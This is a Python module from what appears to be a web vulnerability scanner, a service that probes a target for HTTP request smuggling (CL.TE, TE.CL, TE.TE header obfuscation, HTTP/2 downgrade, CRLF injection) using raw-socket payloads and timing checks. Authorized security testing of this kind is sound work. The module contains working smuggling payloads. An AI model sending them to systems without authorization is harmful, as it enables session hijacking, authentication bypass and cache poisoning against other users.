import socket
import ssl
import time
import logging
from urllib.parse import urlparse
from typing import Optional

logger = logging.getLogger(__name__)

TIMEOUT_NORMAL = 5       # seconds for normal request
TIMEOUT_POISON = 10      # seconds — if backend hangs = vuln
TIMEOUT_THRESHOLD = 8    # if response takes > 8s = confirmed


class SmugglingService:
    """
    Tests for HTTP Request Smuggling vulnerabilities.
    Uses raw sockets because HTTP libraries auto-correct
    malformed headers, breaking all smuggling tests.
    
    Detection method: timing-based.
    If the backend hangs waiting for more data after
    receiving a smuggled request = vulnerability confirmed.
    """

    def __init__(self, target_url: str, scan_id: str):
        self.target_url = target_url
        self.scan_id = scan_id
        parsed = urlparse(target_url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.is_https = parsed.scheme == "https"
        self.path = parsed.path or "/"
        if parsed.query:
            self.path += "?" + parsed.query

    def _make_socket(self) -> socket.socket:
        """Create a raw socket, with SSL wrapping for HTTPS."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT_POISON)
        sock.connect((self.host, self.port))
        if self.is_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _send_raw(self, payload_bytes: bytes,
                  read_timeout: float = TIMEOUT_NORMAL) -> tuple:
        """
        Send raw bytes over socket.
        Returns: (response_text, elapsed_seconds, timed_out)
        """
        start = time.time()
        timed_out = False
        response = b""

        try:
            sock = self._make_socket()
            sock.settimeout(read_timeout)
            sock.sendall(payload_bytes)

            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b"\r\n\r\n" in response:
                        break
                except socket.timeout:
                    timed_out = True
                    break

        except socket.timeout:
            timed_out = True
        except Exception as e:
            logger.debug(f"Socket error: {e}")
        finally:
            try:
                sock.close()
            except Exception:
                pass

        elapsed = time.time() - start
        return response.decode("utf-8", errors="replace"), elapsed, timed_out

    def _normal_request_time(self) -> float:
        """
        Measure how long a normal GET request takes.
        Used as baseline for timeout comparison.
        """
        payload = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        _, elapsed, _ = self._send_raw(payload, TIMEOUT_NORMAL)
        return elapsed

    # ─────────────────────────────────────────────────
    # TEST 1: CL.TE SMUGGLING
    # Frontend trusts Content-Length.
    # Backend trusts Transfer-Encoding.
    #
    # The frontend reads exactly Content-Length bytes
    # and forwards the full request to backend.
    # The backend sees Transfer-Encoding: chunked and
    # reads until it finds "0\r\n\r\n".
    # But our chunked body says "5c" (size of chunk),
    # then sends the beginning of a hidden request.
    # The backend reads that, then waits for MORE data
    # to finish the hidden request. It hangs.
    # That hang = CL.TE confirmed.
    # ─────────────────────────────────────────────────
    def test_clte(self) -> Optional[dict]:
        """
        CL.TE: Content-Length says 4 bytes.
        Transfer-Encoding: chunked is also present.
        
        Backend sees chunked body, reads chunk size "7b\r\n"
        then reads 123 bytes of data, but we only sent
        a partial body. Backend hangs waiting for rest.
        
        The "GPOST" at the end is the start of a smuggled
        request that the backend is waiting to receive more of.
        """
        logger.info(f"Testing CL.TE smuggling on {self.host}")

        # This payload has:
        # Content-Length: 4  — frontend reads 4 bytes of body, stops
        # Transfer-Encoding: chunked — backend uses this instead
        # Body chunk "1" = 1 byte = "Z"
        # Then "0" = end of chunked body supposedly
        # But Content-Length says only 4, so frontend
        # cuts the request after "1\r\nZ\r\n" (4 bytes of chunks)
        # Backend gets: chunked body with chunk "1" then
        # expects another chunk. Hangs waiting.
        
        body = "1\r\nZ\r\nQ"
        
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        _, elapsed, timed_out = self._send_raw(
            payload, TIMEOUT_POISON
        )

        if elapsed > TIMEOUT_THRESHOLD:
            return self._make_finding(
                "CL.TE",
                f"Backend hung for {elapsed:.1f}s after CL.TE payload. "
                f"Frontend trusted Content-Length, backend trusted "
                f"Transfer-Encoding. Hidden request confirmed."
            )
        return None

    # ─────────────────────────────────────────────────
    # TEST 2: TE.CL SMUGGLING  
    # Frontend trusts Transfer-Encoding.
    # Backend trusts Content-Length.
    #
    # Frontend reads the chunked body until "0\r\n\r\n"
    # and forwards everything to backend.
    # Backend sees Content-Length: 3 and reads only 3 bytes.
    # The rest of the body ("GPOST / HTTP/1.1...") is left
    # in the buffer and gets prepended to the next request.
    # ─────────────────────────────────────────────────
    def test_tecl(self) -> Optional[dict]:
        """
        TE.CL: Transfer-Encoding: chunked (frontend uses this).
        Content-Length: 3 (backend uses this, reads only 3 bytes).
        
        We send a chunked body with a hidden request inside.
        Frontend strips chunked encoding, passes full body.
        Backend reads only 3 bytes (Content-Length: 3),
        leaving the hidden "GPOST" request in the TCP buffer.
        Next request from any user gets that prefix prepended.
        """
        logger.info(f"Testing TE.CL smuggling on {self.host}")

        # Hidden request that gets left in backend buffer
        hidden_request = (
            "GPOST / HTTP/1.1\r\n"
            "Host: " + self.host + "\r\n"
            "Content-Length: 10\r\n"
            "\r\n"
            "smuggled=1"
        )

        # Chunk 1: "3\r\nXYZ\r\n" = 3 bytes, 
        #   backend reads this (Content-Length: 3)
        # Chunk 2: the hidden request
        # Chunk 0: end of chunked body
        chunk1_data = "XYZ"
        chunk1 = f"{len(chunk1_data):x}\r\n{chunk1_data}\r\n"
        chunk2 = f"{len(hidden_request):x}\r\n{hidden_request}\r\n"
        chunk_end = "0\r\n\r\n"
        
        full_body = chunk1 + chunk2 + chunk_end

        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{full_body}"
        ).encode()

        _, elapsed, timed_out = self._send_raw(
            payload, TIMEOUT_POISON
        )

        if elapsed > TIMEOUT_THRESHOLD:
            return self._make_finding(
                "TE.CL",
                f"Backend hung for {elapsed:.1f}s after TE.CL payload. "
                f"Frontend trusted Transfer-Encoding, backend trusted "
                f"Content-Length. Hidden request left in buffer."
            )
        return None

    # ─────────────────────────────────────────────────
    # TEST 3: TE.TE OBFUSCATION VARIANTS
    # Both servers support Transfer-Encoding: chunked
    # but ONE of them can be confused by a malformed
    # or obfuscated Transfer-Encoding header value.
    # The confused server ignores it, falls back to
    # Content-Length, and we have CL.TE or TE.CL again.
    # ─────────────────────────────────────────────────
    def test_tete_obfuscation(self) -> Optional[dict]:
        """
        TE.TE: Send multiple Transfer-Encoding headers,
        or malformed values that one server accepts
        and another ignores.
        
        Variants to try:
        - Transfer-Encoding: xchunked
        - Transfer-Encoding: x-custom, chunked
        - Transfer-Encoding: \x09chunked  (tab before)
        - Transfer-Encoding: chunked\x20  (space after)
        - Transfer-Encoding[space]: chunked (space in header name)
        - Two Transfer-Encoding headers (duplicate)
        - Transfer-Encoding: cow (invalid, server ignores it)
        """
        logger.info(f"Testing TE.TE obfuscation on {self.host}")

        TE_VARIANTS = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding: x-custom, chunked",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: chunked, identity",
            "Transfer-Encoding\x20: chunked",
            "X-Transfer-Encoding: chunked\r\nTransfer-Encoding: cow",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        ]

        body_chunk = "1\r\nZ\r\n"
        body_end = "0\r\n\r\n"
        body = body_chunk + body_end

        for te_variant in TE_VARIANTS:
            payload = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body_chunk)}\r\n"
                f"{te_variant}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{body}"
            ).encode()

            _, elapsed, timed_out = self._send_raw(
                payload, TIMEOUT_POISON
            )

            if elapsed > TIMEOUT_THRESHOLD:
                return self._make_finding(
                    "TE.TE",
                    f"TE.TE obfuscation worked with variant: "
                    f"'{te_variant}'. Backend hung {elapsed:.1f}s. "
                    f"One server ignored the malformed "
                    f"Transfer-Encoding header, causing desync."
                )

        return None

    # ─────────────────────────────────────────────────
    # TEST 4: HTTP/2 DOWNGRADE (H2.CL and H2.TE)
    # Modern frontends accept HTTP/2 but translate to
    # HTTP/1.1 for the backend. If the frontend trusts
    # HTTP/2 framing and adds a Content-Length header,
    # the backend might get confused.
    # ─────────────────────────────────────────────────
    def test_h2_downgrade(self) -> Optional[dict]:
        """
        H2.CL: Send HTTP/2 request with Content-Length
        that doesn't match actual body length.
        Frontend forwards as HTTP/1.1 with that 
        Content-Length to backend.
        Backend reads too many or too few bytes.
        
        We test this by checking if the server supports
        HTTP/2 and then testing the downgrade behavior.
        """
        logger.info(f"Testing H2 downgrade smuggling on {self.host}")

        # Check if server supports HTTP/2
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))

            if self.is_https:
                ssl_sock = ctx.wrap_socket(
                    sock,
                    server_hostname=self.host
                )
                negotiated = ssl_sock.selected_alpn_protocol()
                ssl_sock.close()

                if negotiated != "h2":
                    return None  # No HTTP/2, skip this test

        except Exception:
            return None

        # Server supports H2. Now test H2.CL smuggling.
        # We need to send an actual HTTP/2 request.
        # Use the h2 library if available, else skip.
        try:
            import h2.connection
            import h2.config
            import h2.events

        except ImportError:
            logger.debug("h2 library not installed, skipping H2 test")
            return None

        try:
            config = h2.config.H2Configuration(
                client_side=True,
                header_encoding="utf-8"
            )
            conn = h2.connection.H2Connection(config=config)

            ssl_sock = ssl.create_default_context()
            ssl_sock.check_hostname = False
            ssl_sock.verify_mode = ssl.CERT_NONE
            ssl_sock.set_alpn_protocols(["h2"])

            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(TIMEOUT_POISON)
            raw.connect((self.host, self.port))
            tls = ssl_sock.wrap_socket(raw, server_hostname=self.host)

            conn.initiate_connection()
            tls.sendall(conn.data_to_send(65535))

            # Send request with mismatched Content-Length
            # Actual body is "X" (1 byte)
            # Content-Length claims 100 bytes
            # Backend will wait for 99 more bytes = hang
            headers = [
                (":method", "POST"),
                (":path", self.path),
                (":scheme", "https" if self.is_https else "http"),
                (":authority", self.host),
                ("content-type", "application/x-www-form-urlencoded"),
                ("content-length", "100"),
            ]

            conn.send_headers(1, headers)
            conn.send_data(1, b"X", end_stream=True)
            tls.sendall(conn.data_to_send(65535))

            start = time.time()
            try:
                tls.recv(4096)
            except socket.timeout:
                pass
            elapsed = time.time() - start
            tls.close()

            if elapsed > TIMEOUT_THRESHOLD:
                return self._make_finding(
                    "H2.CL",
                    f"HTTP/2 downgrade smuggling detected. "
                    f"H2 frontend forwarded wrong Content-Length "
                    f"to HTTP/1.1 backend. Backend hung {elapsed:.1f}s."
                )

        except Exception as e:
            logger.debug(f"H2 test error: {e}")

        return None

    # ─────────────────────────────────────────────────
    # TEST 5: HEADER INJECTION VIA CRLF
    # If a proxy blindly forwards header values without
    # sanitizing CRLF characters, an attacker can inject
    # new headers — including a second Transfer-Encoding.
    # ─────────────────────────────────────────────────
    def test_crlf_header_injection(self) -> Optional[dict]:
        """
        Test if injecting CRLF into a header value
        allows inserting extra headers.
        
        If a server accepts:
        X-Custom: foo\r\nTransfer-Encoding: chunked
        
        And forwards that to the backend as two headers,
        the backend sees an extra Transfer-Encoding.
        Combined with a mismatched Content-Length:
        we have smuggling.
        """
        logger.info(f"Testing CRLF header injection on {self.host}")

        # Inject Transfer-Encoding via CRLF in another header
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 30\r\n"
            f"X-Injected: test\r\nTransfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"1\r\nZ\r\n"
            f"0\r\n\r\n"
        ).encode()

        _, elapsed, timed_out = self._send_raw(
            payload, TIMEOUT_POISON
        )

        if elapsed > TIMEOUT_THRESHOLD:
            return self._make_finding(
                "CRLF Header Injection → Smuggling",
                f"CRLF injection in header value allowed injecting "
                f"Transfer-Encoding. Backend hung {elapsed:.1f}s. "
                f"Header sanitization is missing in proxy."
            )
        return None

    # ─────────────────────────────────────────────────
    # MAIN SCAN METHOD
    # ─────────────────────────────────────────────────
    def scan(self) -> list:
        """
        Run all smuggling tests.
        Returns list of findings in ShieldSentinel schema.
        """
        findings = []

        # Get baseline response time first
        try:
            baseline = self._normal_request_time()
            logger.info(
                f"Baseline request time for {self.host}: "
                f"{baseline:.2f}s"
            )
        except Exception:
            baseline = 0.5

        tests = [
            ("CL.TE", self.test_clte),
            ("TE.CL", self.test_tecl),
            ("TE.TE Obfuscation", self.test_tete_obfuscation),
            ("H2 Downgrade", self.test_h2_downgrade),
            ("CRLF Injection", self.test_crlf_header_injection),
        ]

        for test_name, test_func in tests:
            try:
                logger.info(f"Running smuggling test: {test_name}")
                result = test_func()
                if result:
                    findings.append(result)
                    logger.warning(
                        f"SMUGGLING FOUND: {test_name} "
                        f"on {self.host}"
                    )
                # Small delay between tests
                time.sleep(0.5)

            except Exception as e:
                logger.error(
                    f"Smuggling test {test_name} error: {e}",
                    exc_info=True
                )
                continue

        # If nothing found, report as tested+clean
        if not findings:
            findings.append({
                "scan_id": self.scan_id,
                "vuln_type": "HTTP Request Smuggling",
                "severity": "info",
                "url": self.target_url,
                "evidence": (
                    "All 5 smuggling tests completed. "
                    "No timing anomalies detected. "
                    "Tests run: CL.TE, TE.CL, TE.TE, "
                    "H2 Downgrade, CRLF Injection."
                ),
                "description": (
                    "HTTP Request Smuggling tests found no "
                    "vulnerability. Server correctly handles "
                    "conflicting Content-Length and "
                    "Transfer-Encoding headers."
                ),
                "attack_worked": False,
                "owasp_category": "A07:2021 - Identification Failures",
                "tool_source": "smuggling_detector",
                "was_attempted": True,
            })

        return findings

    # ─────────────────────────────────────────────────
    # HELPER
    # ─────────────────────────────────────────────────
    def _make_finding(self, smuggling_type: str,
                      evidence: str) -> dict:
        return {
            "scan_id": self.scan_id,
            "vuln_type": "HTTP Request Smuggling",
            "severity": "critical",
            "url": self.target_url,
            "evidence": evidence,
            "description": (
                f"HTTP Request Smuggling confirmed ({smuggling_type}). "
                f"The frontend proxy and backend server disagree on "
                f"where HTTP requests end. An attacker can inject a "
                f"hidden request that gets prepended to another user's "
                f"request — hijacking their session, bypassing "
                f"authentication, or poisoning the cache. This affects "
                f"ALL users of the application, not just the attacker."
            ),
            "attack_worked": True,
            "owasp_category": "A07:2021 - Identification Failures",
            "tool_source": "smuggling_detector",
            "was_attempted": True,
            "attack_name": f"HTTP Request Smuggling ({smuggling_type})",
            "quick_fix": (
                "1. Normalize all requests at the frontend before "
                "forwarding to backend. "
                "2. If both Content-Length and Transfer-Encoding "
                "present, reject the request. "
                "3. Use HTTP/2 end-to-end (no HTTP/1.1 in backend). "
                "4. Configure your proxy (Nginx/HAProxy) to "
                "reject ambiguous requests."
            ),
            "money_loss_min": 500000,
            "money_loss_max": 50000000,
        }


# ─────────────────────────────────────────────────
# INTEGRATION FUNCTION
# Called from celery worker like all other services
# ─────────────────────────────────────────────────
def test_http_smuggling(target_url: str,
                         scan_id: str,
                         on_progress=None) -> list:
    """
    Entry point called from the scan pipeline.
    """
    if on_progress:
        on_progress("🚇 Testing HTTP Request Smuggling...", 74)

    try:
        service = SmugglingService(target_url, scan_id)
        findings = service.scan()

        vuln_count = sum(
            1 for f in findings if f["attack_worked"]
        )

        if on_progress:
            if vuln_count > 0:
                on_progress(
                    f"🚨 HTTP Smuggling CONFIRMED: "
                    f"{vuln_count} variant(s) found!", 78
                )
            else:
                on_progress(
                    "✅ HTTP Smuggling: All tests passed", 78
                )

        return findings

    except Exception as e:
        logger.error(f"Smuggling scan failed: {e}", exc_info=True)
        return [{
            "scan_id": scan_id,
            "vuln_type": "HTTP Request Smuggling",
            "severity": "info",
            "url": target_url,
            "evidence": f"Test could not complete: {str(e)[:100]}",
            "description": "Smuggling test encountered an error.",
            "attack_worked": False,
            "tool_source": "smuggling_detector",
            "was_attempted": True,
        }]
